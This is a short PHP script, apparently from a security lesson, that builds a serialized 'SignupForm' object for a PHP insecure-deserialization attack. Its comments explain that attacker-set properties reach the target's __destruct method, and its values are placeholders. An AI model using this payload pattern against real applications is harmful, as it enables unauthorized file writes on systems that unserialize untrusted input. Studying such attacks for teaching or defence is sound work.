<?php

//if we can see the code, we can replicate the structure
//our data gets deserialised and triggers the __destruct method
class SignupForm
{
    //we can set these variables to whatever we like
    public $outfile = "gotcha.txt";
    public $username_string = "malicious stuff goes here";
}

$class_instance = new SignupForm;

$serialised_object = serialize($class_instance);

echo $serialised_object . "\n";

?>
